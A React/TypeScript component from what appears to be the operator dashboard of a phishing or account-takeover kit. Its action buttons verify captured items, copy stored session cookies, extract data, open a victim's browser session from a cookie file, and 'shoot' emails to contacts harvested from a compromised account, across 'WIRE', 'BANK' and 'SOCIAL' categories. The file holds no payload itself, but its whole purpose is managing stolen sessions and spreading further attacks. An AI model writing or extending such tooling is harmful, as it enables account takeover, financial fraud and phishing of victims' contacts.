import { useState, useEffect } from 'react';
import { createPortal } from 'react-dom';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import { 
  faCheck, 
  faCookie, 
  faFileExport,
  faPaperPlane,
  faStickyNote,
  faClock,
  faDesktop
} from '@fortawesome/free-solid-svg-icons';
import ConfirmationModal from '../../ConfirmationModal';
import { ShootContactsModal } from './ShootContactsModal';

interface TableActionsProps {
  item: any;
  onVerify: (id: string) => void;
  onGetCookie: (id: string) => void;
  onExtract: (id: string) => void;
  onShootContacts?: (data: {
    id: string;
    selectedContacts: Array<{
      name?: string;
      email?: string;
      phone?: string | number;
      company?: string;
      platform?: string;
      username?: string;
    }>;
    subject: string;
    body: string;
  }) => void;
  onOpenSession?: (browserId: string) => void;
  onMemoSave: (id: string, text: string) => void;
  loading?: boolean;
  category: 'WIRE' | 'BANK' | 'SOCIAL';
}

export const TableActions = ({
  item,
  onVerify,
  onGetCookie,
  onExtract,
  onShootContacts,
  onOpenSession,
  onMemoSave,
  loading,
  category
}: TableActionsProps) => {
  const [showMemoInput, setShowMemoInput] = useState(false);
  const [memoText, setMemoText] = useState(item.memo || '');
  const [lastSaved, setLastSaved] = useState<Date | null>(null);
  const [showConfirmModal, setShowConfirmModal] = useState(false);
  const [showShootContactsModal, setShowShootContactsModal] = useState(false);
  const [currentAction, setCurrentAction] = useState<{
    type: 'verify' | 'cookie' | 'extract';
    id: string;
  } | null>(null);

  // Auto-save memo
  useEffect(() => {
    let saveTimeout: NodeJS.Timeout;
    if (showMemoInput && memoText !== item.memo) {
      saveTimeout = setTimeout(async () => {
        await onMemoSave(item.id, memoText);
        setLastSaved(new Date());
      }, 1000);
    }
    return () => clearTimeout(saveTimeout);
  }, [memoText, item.id, item.memo, showMemoInput]);

  // Determine if we should show the shoot contacts button
  const hasExtract = item[`${category.toLowerCase()}Extract`];
  const canShootContacts = item.fullAccess === 'TRUE' && 
    item.verifyAccess === 'TRUE' && 
    item.cookieAccess === 'TRUE' && 
    hasExtract && 
    onShootContacts && 
    category !== 'BANK';

  const handleAction = (type: 'verify' | 'cookie' | 'extract') => {
    setCurrentAction({ type, id: item.id });
    setShowConfirmModal(true);
  };

  const handleConfirm = async () => {
    if (!currentAction) return;

    switch (currentAction.type) {
      case 'verify':
        await onVerify(currentAction.id);
        break;
      case 'cookie':
        await onGetCookie(currentAction.id);
        break;
      case 'extract':
        await onExtract(currentAction.id);
        break;
    }
    setShowConfirmModal(false);
    setCurrentAction(null);
  };

  const modalPortal = typeof document !== 'undefined' && createPortal(
    <>
      {canShootContacts && (
        <ShootContactsModal
          isOpen={showShootContactsModal}
          onClose={() => setShowShootContactsModal(false)}
          onSubmit={async (data) => {
            if (onShootContacts) {
              await onShootContacts(data);
            }
            setShowShootContactsModal(false);
          }}
          loading={loading}
          item={item}
          category={category}
        />
      )}

      <ConfirmationModal
        isOpen={showConfirmModal}
        onClose={() => setShowConfirmModal(false)}
        onConfirm={handleConfirm}
        title={`Confirm ${currentAction?.type}`}
        message={`Are you sure you want to ${currentAction?.type} this item?`}
      />

      {showMemoInput && (
        <div className="fixed inset-0 bg-black bg-opacity-50 dark:bg-opacity-75 flex items-center justify-center z-50" onClick={(e) => e.stopPropagation()}>
          <div className="bg-white dark:bg-gray-800 rounded-lg p-6 max-w-xl w-full">
            <div className="flex justify-between items-center mb-4">
              <h2 className="text-xl font-bold dark:text-white">Edit Memo</h2>
              <button onClick={() => setShowMemoInput(false)} className="text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200">
                ×
              </button>
            </div>
            <textarea
              value={memoText}
              onChange={(e) => setMemoText(e.target.value)}
              className="w-full h-32 p-2 border rounded dark:bg-gray-700 dark:border-gray-600 dark:text-white"
              placeholder="Enter memo text..."
            />
            {lastSaved && (
              <div className="mt-2 text-sm text-gray-500 dark:text-gray-400">
                <FontAwesomeIcon icon={faClock} className="mr-1" />
                Last saved: {lastSaved.toLocaleTimeString()}
              </div>
            )}
          </div>
        </div>
      )}
    </>,
    document.body
  );

  return (
    <>
      <div className="flex items-center space-x-2">
        {item.verified !== 'TRUE' && (
          <button
            onClick={(e) => {
              e.stopPropagation();
              handleAction('verify');
            }}
            className="text-indigo-600 hover:text-indigo-900 dark:text-indigo-400 dark:hover:text-indigo-300"
            disabled={loading}
            title="Verify"
          >
            <FontAwesomeIcon icon={faCheck} />
            <span className="hidden lg:inline-block ml-1">Verify</span>
          </button>
        )}

        {item.verifyAccess === 'TRUE' && item.cookieAccess === 'TRUE' && item.cookieJSON && (
          <button
            onClick={(e) => {
              e.stopPropagation();
              const cookieData = typeof item.cookieJSON === 'string' ? item.cookieJSON : JSON.stringify(item.cookieJSON);
              navigator.clipboard.writeText(cookieData);
            }}
            className="text-indigo-600 hover:text-indigo-900 dark:text-indigo-400 dark:hover:text-indigo-300"
            disabled={loading}
            title="Cookie"
          >
            <FontAwesomeIcon icon={faCookie} />
            <span className="hidden lg:inline-block ml-1">Cookie</span>
          </button>
        )}

        {item.fullAccess === 'TRUE' && item.verifyAccess === 'TRUE' && item.cookieAccess === 'TRUE' && (
          <button
            onClick={(e) => {
              e.stopPropagation();
              handleAction('extract');
            }}
            className="text-indigo-600 hover:text-indigo-900 dark:text-indigo-400 dark:hover:text-indigo-300"
            disabled={loading}
            title="Extract"
          >
            <FontAwesomeIcon icon={faFileExport} />
            <span className="hidden lg:inline-block ml-1">Extract</span>
          </button>
        )}

        {canShootContacts && (
          <button
            onClick={(e) => {
              e.stopPropagation();
              setShowShootContactsModal(true);
            }}
            className="text-indigo-600 hover:text-indigo-900 dark:text-indigo-400 dark:hover:text-indigo-300"
            disabled={loading}
            title="Shoot"
          >
            <FontAwesomeIcon icon={faPaperPlane} />
            <span className="hidden lg:inline-block ml-1">Shoot</span>
          </button>
        )}

        {item.cookieAccess === 'TRUE' && item.cookieFileURL && item.cookieFileURL !== '' && onOpenSession && (
          <button
            onClick={(e) => {
              e.stopPropagation();
              onOpenSession(item.submissionId || item.browserId || item.id);
            }}
            className="text-indigo-600 hover:text-indigo-900 dark:text-indigo-400 dark:hover:text-indigo-300"
            disabled={loading}
            title="Open Session"
          >
            <FontAwesomeIcon icon={faDesktop} />
            <span className="hidden lg:inline-block ml-1">Session</span>
          </button>
        )}

        <button
          onClick={(e) => {
            e.stopPropagation();
            setShowMemoInput(true);
          }}
          className="text-indigo-600 hover:text-indigo-900 dark:text-indigo-400 dark:hover:text-indigo-300"
          title="Memo"
        >
          <FontAwesomeIcon icon={faStickyNote} />
          <span className="hidden lg:inline-block ml-1">Memo</span>
        </button>
      </div>

      {modalPortal}
    </>
  );
};
